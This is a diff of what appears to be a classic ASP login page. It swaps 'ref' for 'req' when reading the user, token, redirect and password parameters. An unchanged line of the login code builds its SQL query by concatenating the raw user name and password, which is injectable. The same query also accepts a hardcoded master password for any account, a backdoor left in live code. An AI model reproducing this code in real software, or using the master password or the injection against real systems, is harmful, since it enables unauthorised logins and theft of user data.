@@ -441,10 +441,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <%
     end if
 
-
-
-    if ref("User")<>"" or ref("tokenLogin")<>"" then
-
+    if req("User")<>"" or req("tokenLogin")<>"" then
         if req("Partner")="" then
             set tryLogin = dbc.execute("select u.*, l.Cliente, l.NomeEmpresa, l.FimTeste, l.DataHora, l.LocaisAcesso, l.IPsAcesso, l.Logo, l.`Status` from licencasusuarios as u left join licencas as l on l.id=u.LicencaID where Email='"&ref("User")&"' and (Senha='"&ref("Password")&"' or '"&ref("Password")&"'='##Yogo@@Nutella.')")
 %>
@@ -496,16 +493,17 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                         RedirectLogin = False
 
 
-                        if ref("RedirectLogin")<>"" then
+                        if req("RedirectLogin")<>"" then
                             RedirectLogin=True
                         end if
 
-                        if ref("Password")<>"" and RedirectLogin then
+                        if req("Password")<>"" and RedirectLogin then
                             PasswordValue = req("Password")
                         end if
 
-                        if ref("User")<>"" then
+                        if req("User")<>"" then
                             User = req("User")
+
                         else
                             User = request.Cookies("User")
                         end if
